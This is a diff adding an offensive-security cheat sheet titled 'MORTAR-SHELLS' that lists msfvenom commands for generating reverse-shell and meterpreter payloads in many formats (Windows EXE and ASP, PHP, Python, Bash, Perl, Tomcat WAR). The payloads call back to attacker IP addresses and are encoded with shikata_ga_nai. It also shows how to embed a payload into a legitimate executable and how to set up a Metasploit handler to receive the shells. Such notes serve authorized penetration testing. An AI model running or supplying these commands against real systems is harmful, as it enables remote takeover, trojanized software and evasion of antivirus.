@@ -1,0 +1,81 @@
+MORTAR-SHELLS
+buffer overflow
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.34.31 LPORT=443 -f c -a x86 --platform windows -b "\x00\x20\x0a\x0d" -e x86/shikata_ga_nai -k
+
+----------
+
+Python
+
+msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f raw > shell.py
+----------
+
+Bash
+
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f raw > shell.sh
+
+----------
+
+Perl
+
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f raw > shell.pl
+
+----------
+
+Windows ASP
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.220 LPORT=443 -f asp -e x86/shikata_ga_nai -i 10  > Desktop/shell.asp 
+
+----------
+
+Windows Executable
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f exe -e x86/shikata_ga_nai -i 10 > /Desktop/shell.exe
+
+----------
+
+WAR - IE Tomcat shell 
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=4444 -f war > shell.war
+
+----------
+
+Generic shell
+
+msfvenom -p windows/shell_reverse_tcp -f js_le -e generic/none -a x86 --platform windows -s 342 LHOST=10.11.0.220 LPORT=443
+
+
+----------
+
+PHP
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.174.129 LPORT=443 -f raw -e x86/shikata_ga_nai -i 3 > shell.php
+
+----------
+
+Embed the code in an executable
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.100 LPORT=4460 -f exe -e x86/shikata_ga_nai -i 10 -k -x original-file.exe > new-file-with-malicious-code.exe
+
+"""""""
+use this within msfconsole
+
+use payload/windows/meterpreter/bind_tcp
+set LPORT 2444
+generate -t exe -f /var/www/html/msf_bind2444.exe
+
+"""""""
+
+
+
+Handlers
+
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
+
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+
